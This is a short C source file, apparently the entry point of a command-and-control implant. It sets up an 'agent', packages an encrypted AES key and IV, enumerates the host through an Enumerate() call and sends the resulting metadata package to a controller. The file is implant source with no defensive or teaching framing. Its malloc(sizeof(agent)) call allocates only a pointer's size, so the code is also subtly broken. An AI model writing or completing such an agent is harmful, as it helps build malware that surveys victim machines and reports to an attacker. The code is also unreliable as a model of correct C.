#include "package.h"
#include "agent.h"
#include "enum.h"
#include "Http.h"

int main()
{
    pPackage pPack;
    pAgent agent = (Agent*)malloc(sizeof(agent));
    INT err;

    if ((err = init_agent(agent)) != 0) {
		printf("[error] attempting to initialize agent\n");
		return -1;
	}

    
    if ((pPack = CreatePackageWithMetaData(INITIALIZE_AGENT, &agent)) == NULL) {
        printf("[error] attempting to create package\n");
        return -1;
    }
    //add package to agentData.
    agent->packages = pPack;
    AddPackageToAgentPackageList(agent, pPack);


    if ((err = AddBytesToPackage(agent->packages, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }

    if ((err = AddBytesToPackage(agent->packages, agent->EncryptedIV, agent->EncryptedIVSize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }

    Enumerate(agent);

    if ((err = AddStringToPackage(agent->packages, "ENCRYPTION TEST!!! THIS IS AN ENCRYPTION TEST!!\nLOLOLOLTEST%%$@(((*@)_#\n123400")) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add the dummy data to encrypted\n");
        return -1;
    }

    PackageSendMetaDataPackage(agent->packages, NULL, NULL, agent);
}

